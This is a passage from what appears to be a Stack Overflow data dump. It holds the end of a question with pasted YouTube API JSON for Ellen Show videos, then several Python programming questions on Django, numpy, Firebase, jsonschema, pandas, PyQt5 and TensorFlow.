    'description': ""The two music icons played a revealing game with Ellen. You won't believe their responses."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-03-19T13:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/07nXzFPHiGU/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/07nXzFPHiGU/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/07nXzFPHiGU/mqdefault.jpg',
      'width': 320}},
    'title': 'Never Have I Ever with Madonna and Justin Bieber'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/Z8HWp7YAzQPWcodFthhbxOU3l2U""',
   'id': {'kind': 'youtube#video', 'videoId': 'Wh8m4PYlSGY'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Ellen challenged Jennifer Lopez to a round of her fun and revealing game.',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-05-18T19:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/Wh8m4PYlSGY/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/Wh8m4PYlSGY/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/Wh8m4PYlSGY/mqdefault.jpg',
      'width': 320}},
    'title': 'J.Lo and Ellen Play Never Have I Ever'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/3B4UvmeCI4Y9UZC2f6kF09wpmW8""',
   'id': {'kind': 'youtube#video', 'videoId': 'QJY5VVQsFZ0'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Adele sure can sing, but can she beat the clock? Watch what happened when Ellen challenged her to a game of 5 Second Rule!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2016-02-24T14:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/QJY5VVQsFZ0/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/QJY5VVQsFZ0/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/QJY5VVQsFZ0/mqdefault.jpg',
      'width': 320}},
    'title': '5 Second Rule with Adele'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/mYDa0rUVIvzHCbQfJGRq2VeZ2so""',
   'id': {'kind': 'youtube#video', 'videoId': 'vEVrYx8-lys'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': '""Brave"" may be the wrong word, but Ellen\'s Executive Producer, Andy Lassner, and his assistant, Jacqueline, made their way through a haunted house.',
    'liveBroadcastContent': 'none',
    'publishedAt': '2014-10-31T16:50:33.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/vEVrYx8-lys/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/vEVrYx8-lys/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/vEVrYx8-lys/mqdefault.jpg',
      'width': 320}},
    'title': 'Andy and Jacqueline Brave the Haunted House'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/kprvuH9aAXC-dIAlXMbwA3Klp14""',
   'id': {'kind': 'youtube#video', 'videoId': 'wTAJSuhgZxA'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Adele's new single is a hit, thanks to a chat she had with Ellenâ¦"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-10-29T13:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/wTAJSuhgZxA/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/wTAJSuhgZxA/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/wTAJSuhgZxA/mqdefault.jpg',
      'width': 320}},
    'title': ""Ellen Inspired Adele's New Song""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/Ge10B_3x9KSfQTWF5V-ZNHDuqwU""',
   'id': {'kind': 'youtube#video', 'videoId': 'oJsYwehp_r4'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'She loves to scare her guests. Take a look at a few of these recent favorites!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-05-27T13:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/oJsYwehp_r4/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/oJsYwehp_r4/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/oJsYwehp_r4/mqdefault.jpg',
      'width': 320}},
    'title': ""Ellen's Favorite Scares""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/Em-6euVf5saohkrtNZzXR2jmaTo""',
   'id': {'kind': 'youtube#video', 'videoId': 'Vap9SMRf8YE'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Ellen and Sofia played a hilarious game of 5 Second Rule! Check it out, plus all the fun we didn't have time for in the show!"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-12-03T14:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/Vap9SMRf8YE/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/Vap9SMRf8YE/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/Vap9SMRf8YE/mqdefault.jpg',
      'width': 320}},
    'title': '5 Second Rule with Sofia Vergara -- Extended!'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/o7GMiOOo84bHhNwHGc6qQZ1ebRc""',
   'id': {'kind': 'youtube#video', 'videoId': 'ZXZ6K21wvZM'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Ellen's writer Amy scares pretty easily, but she's nothing compared to Ellen's Executive Producer, Andy. That's why he was the perfect person to join Amy in this ..."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2013-10-22T13:00:05.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/ZXZ6K21wvZM/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/ZXZ6K21wvZM/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/ZXZ6K21wvZM/mqdefault.jpg',
      'width': 320}},
    'title': ""Andy and Amy's Haunted House""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/SyuA5bIoXdtQD_0SQUu1PyfvPP4""',
   'id': {'kind': 'youtube#video', 'videoId': 'QrIrbeoDkT0'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Ellen met Noah Ritter after a video of him went viral. Nobody could have predicted what she was in for. Ellen Meets the 'Apparently' Kid, Part 2 ..."",
    'liveBroadcastContent': 'none',
    'publishedAt': '2014-09-11T18:37:28.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/QrIrbeoDkT0/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/QrIrbeoDkT0/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/QrIrbeoDkT0/mqdefault.jpg',
      'width': 320}},
    'title': 'Ellen Meets the âApparentlyâ Kid, Part 1'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/Ag0Zp0Gg9tiWeBYr4k1p5W7EnLI""',
   'id': {'kind': 'youtube#video', 'videoId': 'U8Gv83xiFP8'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Emma Stone, Jamie Foxx and Andrew Garfield all participated in a revealing round of the saucy question and answer game.',
    'liveBroadcastContent': 'none',
    'publishedAt': '2014-04-04T04:55:12.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/U8Gv83xiFP8/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/U8Gv83xiFP8/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/U8Gv83xiFP8/mqdefault.jpg',
      'width': 320}},
    'title': ""'The Amazing Spider-Man 2' Cast Plays Never Have I Ever""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/EeSV1P1pL1VAVWYm27ev8YIWcTk""',
   'id': {'kind': 'youtube#video', 'videoId': 'QyJ8rulYHpU'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Ellen had a star turn in Nicki's viral video. What did Nicki think? Find out!"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2014-09-10T05:38:21.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/QyJ8rulYHpU/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/QyJ8rulYHpU/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/QyJ8rulYHpU/mqdefault.jpg',
      'width': 320}},
    'title': 'Nicki Minaj Reacts to Ellenâs âAnacondaâ'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/lklEBOJbEqTsZhzFeWQDvaEaovo""',
   'id': {'kind': 'youtube#video', 'videoId': '7nGz7xgGJzc'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""After Ellen saw Brielle's video on ellentube, she invited her to showcase her science smarts on the show!"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-11-23T14:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/7nGz7xgGJzc/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/7nGz7xgGJzc/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/7nGz7xgGJzc/mqdefault.jpg',
      'width': 320}},
    'title': 'Adorable 3-Year-Old Periodic Table Expert Brielle'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/lFfDdAriFOK6-7T-GqAaQrfZrL0""',
   'id': {'kind': 'youtube#video', 'videoId': '2DYfLJrp1TQ'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Ellen loves scaring her executive producer, Andy Lassner, and ""Modern Family"" star Eric Stonestreet. So, of course she couldn\'t wait to send them both through ...',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-10-29T13:00:00.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/2DYfLJrp1TQ/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/2DYfLJrp1TQ/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/2DYfLJrp1TQ/mqdefault.jpg',
      'width': 320}},
    'title': 'Andy Goes to a Haunted House with Eric Stonestreet'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/UPK4p6u7VdWPSkW1Cnz5QKCxfXk""',
   'id': {'kind': 'youtube#video', 'videoId': 'fNJI2A0v8yI'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Leonardo DiCaprio is quite the daredevil, and he told Ellen about a few of his close calls!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2016-01-08T14:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/fNJI2A0v8yI/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/fNJI2A0v8yI/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/fNJI2A0v8yI/mqdefault.jpg',
      'width': 320}},
    'title': ""Leo's Bad Luck""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/cdwuhXK78q9_SFeRcIdz2ZKxvy4""',
   'id': {'kind': 'youtube#video', 'videoId': '3RLTanW1DGo'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'Their visit to the haunted house was so funny, Ellen had to send them again! This time Andy and Amy visited the Queen Mary Dark Harbor, and the results ...',
    'liveBroadcastContent': 'none',
    'publishedAt': '2013-10-31T13:00:03.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/3RLTanW1DGo/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/3RLTanW1DGo/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/3RLTanW1DGo/mqdefault.jpg',
      'width': 320}},
    'title': ""Andy and Amy's Haunted Ship Adventure""}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/N1j-mxkND6apYO8kdjitbd3mOns""',
   'id': {'kind': 'youtube#video', 'videoId': 'zcAQCTZ3TuQ'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': ""Ellen held nothing back when when Mila Kunis was here, and asked her about what's going on between her and Ashton Kutcher. See how she responded!"",
    'liveBroadcastContent': 'none',
    'publishedAt': '2013-02-13T17:14:14.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/zcAQCTZ3TuQ/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/zcAQCTZ3TuQ/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/zcAQCTZ3TuQ/mqdefault.jpg',
      'width': 320}},
    'title': 'Mila Kunis Blushes over Ashton'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/b7ZtfnV8spHzXmzgj_c0lN2dwJ0""',
   'id': {'kind': 'youtube#video', 'videoId': 'pP-PF4nKb0I'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'It was a legendary meeting on The Ellen Show, Sophia Grace &amp; Rosie and Russell Brand met for the very first time to discuss their hometown of Essex, England ...',
    'liveBroadcastContent': 'none',
    'publishedAt': '2012-05-17T02:57:04.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/pP-PF4nKb0I/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/pP-PF4nKb0I/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/pP-PF4nKb0I/mqdefault.jpg',
      'width': 320}},
    'title': 'Sophia Grace &amp; Rosie Meet Russell Brand'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/U3UJ8UFIu4nRHqfysq91oHzinuw""',
   'id': {'kind': 'youtube#video', 'videoId': 'mUr5KxtKZQk'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'After chatting with Sofia Vergara, Ellen sent her into a store on the WB lot for some hidden camera fun!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2010-11-03T19:13:20.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/mUr5KxtKZQk/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/mUr5KxtKZQk/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/mUr5KxtKZQk/mqdefault.jpg',
      'width': 320}},
    'title': 'Sofia Vergara Plays a Hidden Camera Prank'}},
  {'etag': '""I_8xdZu766_FSaexEaDXTIfEWc0/B4kmiOv8FEBHoH3MRiahPrDEGxc""',
   'id': {'kind': 'youtube#video', 'videoId': '5SZ_--mt4bk'},
   'kind': 'youtube#searchResult',
   'snippet': {'channelId': 'UCp0hYYBW6IMayGgR-WeoCvQ',
    'channelTitle': 'TheEllenShow',
    'description': 'They were staked out in the bathroom for this hilarious round of scares!',
    'liveBroadcastContent': 'none',
    'publishedAt': '2015-02-06T14:00:01.000Z',
    'thumbnails': {'default': {'height': 90,
      'url': 'https://i.ytimg.com/vi/5SZ_--mt4bk/default.jpg',
      'width': 120},
     'high': {'height': 360,
      'url': 'https://i.ytimg.com/vi/5SZ_--mt4bk/hqdefault.jpg',
      'width': 480},
     'medium': {'height': 180,
      'url': 'https://i.ytimg.com/vi/5SZ_--mt4bk/mqdefault.jpg',
      'width': 320}},
    'title': 'Justin Bieber and Ellen Scare Audience Members'}},
</code></pre>

<p>Thank you.</p>
"
39714611,5846630.0,2016-09-27 01:11:48+00:00,2,Django tests slows after MacOS Sierra,"<p>I'm working on a Django project using Python 3 and Django 1.10 on Mac.</p>

<p>Before update I was running 40 tests in 0.441s.</p>

<p>Now after MacOS Sierra: Ran 40 tests in 5.487s</p>

<p>I did some investigations and found this line to be the problem:</p>

<pre><code>response = self.client.post(r('subscriptions:new'), data)
</code></pre>

<p>If I pass a empty dict instead of data, the tests run faster. Anyone have a clue why this is happening?</p>
"
40050149,5890240.0,2016-10-14 18:49:27+00:00,2,Python - rename files incrementally based on julian day,"<p><strong>Problem:</strong>
I have a bunch of files that were downloaded from an org. Halfway through their data directory the org changed the naming convention (reasons unknown). I am looking to create a script that will take the files in a directory and rename the file the same way, but simply ""go back one day"". </p>

<p>Here is a sample of how one file is named: <code>org2015365_res_version.asc</code></p>

<p>What I need is logic to only change the year day (<code>2015365</code>) in this case to <code>2015364</code>. This logic needs to span a few years so <code>2015001</code> would be <code>2014365</code>.</p>

<p>I guess I'm not sure this is possible since its not working with the current date so using a module like <code>datetime</code> does not seem applicable.</p>

<p>Partial logic I came up with. I know it is rudimentary at best, but wanted to take a stab at it.</p>

<pre><code># open all files
all_data = glob.glob('/somedir/org*.asc')

# empty array to be appended to
day = []
year = []

# loop through all files
for f in all_data:
    # get first part of string, renders org2015365
    f_split = f.split('_')[0]
    # get only year day - renders 2015365
    year_day = f_split.replace(f_split[:3], '')
    # get only day - renders 365
    days = year_day.replace(year_day[0:4], '')
    # get only year - renders 2015
    day.append(days)
    years = year_day.replace(year_day[4:], '')
    year.append(years)
    # convert to int for easier processing 
    day = [int(i) for i in day]
    year = [int(i) for i in year]

    if day == 001 &amp; year == 2016:
        day = 365
        year = 2015
    elif day == 001 &amp; year == 2015:
        day = 365
        year = 2014
    else:
        day = day - 1
</code></pre>

<p>Apart from the logic above I also came across the function below from <a href=""http://stackoverflow.com/questions/225735/batch-renaming-of-files-in-a-directory"">this</a> post, I am not sure what would be the best way to combine that with the partial logic above. Thoughts?</p>

<pre><code>import glob
import os


def rename(dir, pattern, titlePattern):
    for pathAndFilename in glob.iglob(os.path.join(dir, pattern)):
        title, ext = os.path.splitext(os.path.basename(pathAndFilename))
        os.rename(pathAndFilename,
                  os.path.join(dir, titlePattern % title + ext))

rename(r'c:\temp\xx', r'*.doc', r'new(%s)')
</code></pre>

<p>Help me, stackoverflow. You're my only hope.</p>
"
39714176,6883912.0,2016-09-27 00:09:55+00:00,2,Generating data from meshgrid data (Numpy),"<p>I'd like to ask how to generate corresponding values from a meshgrid. I have a function ""foo"" that takes one 1D array with the length of 2, and returns some real number. </p>

<pre><code>import numpy as np

def foo(X):  
    #this function takes a vector, e.g., np.array([2,3]), and returns a real number.
    return sum(X)**np.sin( sum(X) );

x = np.arange(-2, 1, 1)          # points in the x axis
y = np.arange( 3, 8, 1)          # points in the y axis
X, Y = np.meshgrid(x, y)         # X, Y : grid
</code></pre>

<p>I generate X and Y grids using meshgrid.</p>

<p>Then, how can I generate corresponding Z values using ""foo"" function, in order to plot them in 3D, e.g., plotting using plot_surface function with X,Y,Z values?</p>

<p>Here the question is how to generate Z values, which has the same shape to X and Y, using ""foo"" function. Since my ""foo"" function only takes an 1D array, I do not know how I can uses this function with X and Y to generate corresponding Z values.</p>
"
40076512,6930377.0,2016-10-16 23:13:31+00:00,2,Python Firebase TypeError: get() got multiple values for keyword argument 'connection',"<p>Why does firebase keeps throwing me this error after following up with the tutorial.</p>

<pre><code>firebase = firebase.FirebaseApplication('https://project-1175938335914156477.firebaseio.com', authentication=None)
result = firebase.get('/charges', None,{'print': 'pretty'})
authentication = firebase.Authentication('MY KEY HERE', 'dahalbiplovechs@gmail.com', extra={'id': 123})
firebase.authentication = authentication
user = authentication.get_user()
print user.firebase_auth_token
</code></pre>

<p>That keeps throwing me</p>

<pre><code>TypeError: get() got multiple values for keyword argument 'connection' under 'results' var.
</code></pre>

<p>Does this have to do with my API KEY? I'm using the key I got from </p>

<pre><code>https://console.firebase.google.com/project/PROJECTNAME/settings/general/android:com.geeni
</code></pre>

<p>I got the key under ""Web API KEY"" What am I doing wrong?</p>
"
39718165,1335621.0,2016-09-27 07:05:53+00:00,2,How to build a refresolver to validate REST API response in python?,"<p>I am testing REST API of a software via python, which has json schema draft version 4. The software is in NodeJS, and it has a root json to reach sub json through ref in links. </p>

<p>My questions are:</p>

<ul>
<li><p>what kind of mapping should I build to make my work easier. For example:</p>

<p>I could request for a url, then the url is parsed and mapping to certain schema through reference, then validate.</p></li>
<li><p>Is there any example or description on using <code>jsonschema.RefResolver</code> and <code>jsonschema.Draft4Validator(schema, resolver=resolver).validate(data)</code> ?  Just couldn't find examples of them.</p></li>
<li><p>Validate through Javascript vs Python jsonschema, which is easier?</p></li>
</ul>
"
40047291,6646696.0,2016-10-14 15:50:20+00:00,2,Reading csv from url and pushing it in DB through pandas,"<p>The URL gives a csv formatted data. I am trying to get the data and push it in database. However, I am unable to read data as it only prints header of the file and not complete csv data. Could there be better option?</p>

<pre><code>#!/usr/bin/python3

import pandas as pd
data = pd.read_csv(""some-url"") //URL not provided due to security restrictions. 

for row in data:
    print(row)
</code></pre>
"
40044714,5248253.0,2016-10-14 13:42:55+00:00,2,Python tensor product,"<p>I have the following problem. For performance reasons I use <code>numpy.tensordot</code> and have thus my values stored in tensors and vectors. 
One of my calculations look like this:</p>

<p><a href=""https://i.stack.imgur.com/PLDSC.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/PLDSC.png"" alt=""enter image description here""></a></p>

<p><code>&lt;w_j&gt;</code> is the expectancy value of <code>w_j</code> and <code>&lt;sigma_i&gt;</code> the expectancy value of <code>sigma_i</code>. (Perhaps I should now have called is sigma, because it has nothing to do with standart deviation) Now for further calculations I also need the variance. To the get Variance I need to calculate:
<a href=""https://i.stack.imgur.com/KLmxY.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/KLmxY.png"" alt=""enter image description here""></a></p>

<p>Now when I implemented the first formula into python with <code>numpy.tensordot</code> I was really happy when it worked because this is quite abstract and I am not used to tensors. The code does look like this:</p>

<pre><code>erc = numpy.tensordot(numpy.tensordot(re, ewp, axes=1), ewp, axes=1)
</code></pre>

<p>Now this works and my problem is to write down the correct form for the second formula. One of my attempts was:</p>

<pre><code>serc = numpy.tensordot(numpy.tensordot(numpy.tensordot(numpy.tensordot
(numpy.tensordot(re, re, axes=1), ewp, axes=1), ewp, axes=1)
, ewp, axes=1), ewp, axes=1)
</code></pre>

<p>But this does give me a scalar instead of a vector. Another try was:</p>

<pre><code>serc = numpy.einsum('m, m', numpy.einsum('lm, l -&gt; m',
numpy.einsum('klm, k -&gt; lm', numpy.einsum('jklm, j -&gt; klm',
numpy.einsum('ijk, ilm -&gt; jklm', re, re), ewp), ewp), ewp), ewp)
</code></pre>

<p>The vectors have lenght <code>l</code> and the dimension of the tensor is <code>l * l * l</code>. I hope my problem is understandable and thank you in advance!</p>

<p>Edit: The first formula can in python also written down like: <code>erc2 = numpy.einsum('ik, k -&gt; i', numpy.einsum('ijk, k -&gt; ij', re, ewp), ewp)</code></p>
"
39726477,6849326.0,2016-09-27 13:50:07+00:00,2,"How to subtract QPainterPaths, QPolygon?","<p>I'm trying to understand how <code>path1.subtracted(path2)</code> works. </p>

<ul>
<li><p>I have path1 and path2: <a href=""http://i.stack.imgur.com/HcyA0.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/HcyA0.png"" alt=""image1""></a></p></li>
<li><p>And I'm getting path3 using <code>path3=path1.subtracted(path2)</code>.<br>
Why I'm not getting a path I want? Image: <a href=""http://i.stack.imgur.com/h5TxB.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/h5TxB.png"" alt=""image2""></a></p></li>
</ul>

<p>Here is the code:</p>

<pre><code>from PyQt5.QtCore import QPointF
from PyQt5.QtCore import QRectF, Qt
from PyQt5.QtGui import QPainterPath, QPen
from PyQt5.QtGui import QPolygonF
from PyQt5.QtWidgets import QApplication, QGraphicsScene, \
    QGraphicsView, QPushButton, QWidget, \
    QVBoxLayout, QGraphicsItem, QGraphicsPathItem, QGraphicsRectItem

class Window(QWidget):
    scene = None

    def __init__(self):
        QWidget.__init__(self)
        self.view = View(self)
        self.button = QPushButton('Clear View', self)
        self.button.clicked.connect(self.handleClearView)
        layout = QVBoxLayout(self)
        layout.addWidget(self.view)
        layout.addWidget(self.button)

    def handleClearView(self):
        self.view.scene.clear()


class View(QGraphicsView):
    def __init__(self, parent):

        self.scribing = False
        self.erasing = False
        QGraphicsView.__init__(self, parent)
        self.scene = QGraphicsScene()
        self.setScene(self.scene)

    def resizeEvent(self, QResizeEvent):
        self.setSceneRect(QRectF(self.viewport().rect()))

    def mousePressEvent(self, event):

        if event.buttons() == Qt.LeftButton:
            self.scribing = True

            self.path1 = QPainterPath()
            self.path2 = QPainterPath()

            self.polygon1 = QPolygonF()
            self.polygon1.append(QPointF(100,100))
            self.polygon1.append(QPointF(100, 300))
            self.polygon1.append(QPointF(300, 300))
            self.polygon1.append(QPointF(300, 100))

            self.polygon2 = QPolygonF()
            self.polygon2.append(QPointF(300,100))
            self.polygon2.append(QPointF(300, 300))
            self.polygon2.append(QPointF(100, 300))

            self.path1.addPolygon(self.polygon1)
            self.path2.addPolygon(self.polygon2)

            path3 = self.path1.subtracted(self.path2)

            # self.scene.addPath(self.path1, QPen(Qt.blue))
            # self.scene.addPath(self.path2, QPen(Qt.green))
            self.scene.addPath(path3, QPen(Qt.red))


        if event.buttons() == Qt.RightButton:
            self.erasing = True


    def mouseMoveEvent(self, event):

        if (event.buttons() &amp; Qt.LeftButton) and self.scribing:
            if self.free_draw_item:
                pass

        if event.buttons() &amp; Qt.RightButton and self.erasing:
            pass

    def mouseReleaseEvent(self, event):
        self.scribing = False
        self.erasing = False

        # if self.eraser_item != None:
        #     self.scene.removeItem(self.eraser_item)
        # if self.free_draw_item != None:
        #     self.free_draw_item.setSelected(True)


if __name__ == '__main__':
    import sys

    app = QApplication(sys.argv)
    window = Window()
    window.resize(640, 480)
    window.show()
    sys.exit(app.exec_())
</code></pre>

<p>In this sample I'm working with <code>QPolygonF</code>. Also I've tried to create <code>p1=QPainterPath()</code>, <code>p2=QPainterPath()</code> and subtracted to get <code>p3</code>. But, without success, getting the same result.</p>
"
40042573,5098883.0,2016-10-14 11:54:34+00:00,2,Efficiently change order of numpy array,"<p>I have a 3 dimensional numpy array. The dimension can go up to 128 x 64 x 8192. What I want to do is to change the order in the first dimension by interchanging pairwise. </p>

<p>The only idea I had so far is to create a list of the indices in the correct order.</p>

<pre><code>order    = [1,0,3,2...127,126]
data_new = data[order]
</code></pre>

<p>I fear, that this is not very efficient but I have no better idea so far</p>
"
40077010,6934347.0,2016-10-17 00:33:51+00:00,2,Can't pass random variable to tf.image.central_crop() in Tensorflow,"<p>In Tensorflow I am training from a set of PNG files and I wish to apply data augmentation. I have successfully used <code>tf.image.random_flip_left_right()</code></p>

<p>But I get an error when I try to use <code>tf.image.central_crop()</code>.
basically I would like the central_fraction to be drawn from a uniform distribution (0.8,1.0].</p>

<p>Here is my code. Where did I go wrong? Should <code>frac</code> be a <code>tf.random_uniform()</code>?</p>

<pre><code>filename_queue = tf.train.string_input_producer( tf.train.match_filenames_once(""./images/*.png""))
